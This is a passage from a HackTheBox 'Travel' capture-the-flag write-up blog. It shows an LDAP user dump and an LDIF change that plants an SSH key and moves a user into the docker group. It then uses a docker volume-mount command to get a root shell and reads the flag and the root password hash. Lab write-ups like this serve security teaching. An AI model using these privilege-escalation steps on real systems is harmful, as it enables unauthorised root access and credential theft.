+sn: Wood
+cn: Gloria Wood
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+
+# johnny, users, linux, servers, travel.htb
+dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: johnny
+cn: Johnny Miller
+sn: Miller
+givenName: Johnny
+loginShell: /bin/bash
+uidNumber: 5004
+gidNumber: 5000
+homeDirectory: /home/johnny
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+
+# louise, users, linux, servers, travel.htb
+dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: louise
+cn: Louise Griffin
+sn: Griffin
+givenName: Louise
+loginShell: /bin/bash
+uidNumber: 5007
+gidNumber: 5000
+homeDirectory: /home/louise
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+
+# christopher, users, linux, servers, travel.htb
+dn: uid=christopher,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+uid: christopher
+uidNumber: 5003
+homeDirectory: /home/christopher
+givenName: Christopher
+gidNumber: 5000
+sn: Ward
+cn: Christopher Ward
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: inetOrgPerson
+objectClass: posixAccount
+objectClass: shadowAccount
+loginShell: /bin/bash
+
+# domainusers, groups, linux, servers, travel.htb
+dn: cn=domainusers,ou=groups,ou=linux,ou=servers,dc=travel,dc=htb
+memberUid: frank
+memberUid: brian
+memberUid: christopher
+memberUid: johnny
+memberUid: julia
+memberUid: jerry
+memberUid: louise
+memberUid: eugene
+memberUid: edward
+memberUid: gloria
+memberUid: lynik
+gidNumber: 5000
+cn: domainusers
+objectClass: top
+objectClass: posixGroup
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 22
+# numEntries: 21
+</code></pre><p>By the way, since the hostname, base & bind dn are specified inside <code>.ldaprc</code> we
+can enter <code>ldapsearch -x -w Theroadlesstraveled</code> instead of the full command.</p><p>It seems our account is LDAP admin so we can configure it.</p><p>Let&rsquo;s see interesting groups:</p><pre tabindex=0><code>$ cat /etc/group | grep trvl
+adm:x:4:syslog,trvl-admin
+cdrom:x:24:trvl-admin
+sudo:x:27:trvl-admin
+dip:x:30:trvl-admin
+plugdev:x:46:trvl-admin
+lxd:x:116:trvl-admin
+trvl-admin:x:1000:
+
+$ cat /etc/group | grep docker
+docker:x:117:
+</code></pre><p>Then we can add a key to a user and change it&rsquo;s base groupe to docker & user to
+trvl-admin (not required).</p><pre tabindex=0><code class=language-ldif data-lang=ldif>dn: uid=louise,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changeType: modify
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC/yatK67NXLmgt1LepjDbW2b7lE6z7Y8aIlveOGb6Lp48w0X9qTYNtqe7tgXQCN0qbMlhARBekVewayh4XouStOoEz7jeT8v4vL6awy0XwrqA/asj/LNjDOjAVGBtOsnPn9qE4JXsxQLBGlxouETwrZSUh1FMQFSzO77FasFQO8k59XO9cgCYj/b+TjM+IV5S6uSZPlmchmeT3abJjBaE+JHZ3V9wpCcOZ8v/kMEL+2jW4Rc6R7ChuQeZmNbkZxOx+xiJIu/otpMwrLhApG8zQ3Gm2sCWa1Xg1PjzIga4TD11VHoPgaeqTPhML4Y+zx4WUv8zib3Fl3boYapqiHQy0BMM6knfnCCu+gpkurBtJOqr/4rnq2bL/akVWjjPs3SbKdluQiBp6L8ZJ9dLz2JTpV0TsEEelbnYXT0jY13iAU+iZTnAiJJL/suTFuk1jAvIO8sz1wc8oi0BXaITbaUpKQAnkREdR6rJItH/MO9R2GnPKPby9KshKcvn9eL+jBk= cyfun@penarch
+-
+replace: gidNumber
+gidNumber: 117
+-
+replace: uidNumber
+uidNumber: 1000
+</code></pre><p>Then we can connect via SSH because the SSHD config is the following:</p><pre tabindex=0><code>$ cat /etc/ssh/sshd_config | grep -v &#39;#&#39;
+Include /etc/ssh/sshd_config.d/*.conf
+AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
+AuthorizedKeysCommandUser nobody
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem sftp  /usr/lib/openssh/sftp-server
+PasswordAuthentication no
+Match User trvl-admin,lynik-admin
+        PasswordAuthentication yes
+</code></pre><pre tabindex=0><code>$ ssh -i ~/.ssh/id_rsa louise@travel.htb
+trvl-admin@travel:/$ id
+uid=1000(trvl-admin) gid=117(docker) groups=117(docker),5000(domainusers)
+</code></pre><p>Then let&rsquo;s see images available in docker:</p><pre tabindex=0><code>trvl-admin@travel:/$ docker images
+REPOSITORY            TAG                 IMAGE ID            CREATED             SIZE
+nginx                 latest              602e111c06b6        4 months ago        127MB
+memcached             latest              ac4488374c89        4 months ago        82.3MB
+blog                  latest              4225bf7c5157        4 months ago        981MB
+ubuntu                18.04               4e5021d210f6        5 months ago        64.2MB
+jwilder/nginx-proxy   alpine              a7a1c0b44c8a        7 months ago        54.6MB
+osixia/openldap       latest              4c780dfa5f5e        11 months ago       275M
+</code></pre><p>Now that we are in the docker group it&rsquo;s easy pe thanks to <a href=https://gtfobins.github.io/gtfobins/docker/>gtfobins</a>. By the way we can search gtfobins
+locally via two CLI tools: [gtfo][gtfo] and [gtfoblookup][gtfoblookup].</p><pre tabindex=0><code>$ gtfo -b docker
+...
+# The resulting is a root shell.
+Code:   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+Type:   shell
+...
+
+$ gtfoblookup linux shell docker
+docker:
+
+    shell:
+
+        Description: The resulting is a root shell.
+        Code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</code></pre><pre tabindex=0><code>trvl-admin@travel:/$ docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
+root@d9ba81203eb5:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@d9ba81203eb5:/# cat /root/root.txt
+189d55aa326f561c68c69a547ba2df0f
+root@d9ba81203eb5:/# cat /etc/shadow | grep root
+root:$6$p6a8fCN5/L4rm3FA$bwV15SC9j7QwaRwolnptinKydaRp9O3826E8QlFyrVmjxoaIvs6A.Aw7Z/VCRgGXu0cjLYfmznespEhTS8ZUe/:18397:0:99999:7:::
+</code></pre><p>:
+[jtr]:https://www.openwall.com/john/
+[gtfo]:https://github.com/mzfr/gtfo
+[gtfoblookup]:https://github.com/nccgroup/GTFOBLookup</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/hard/>Hard</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/admirer/><span class=title>« Prev</span><br><span>Admirer </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/remote/><span class=title>Next »</span><br><span>Remote</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
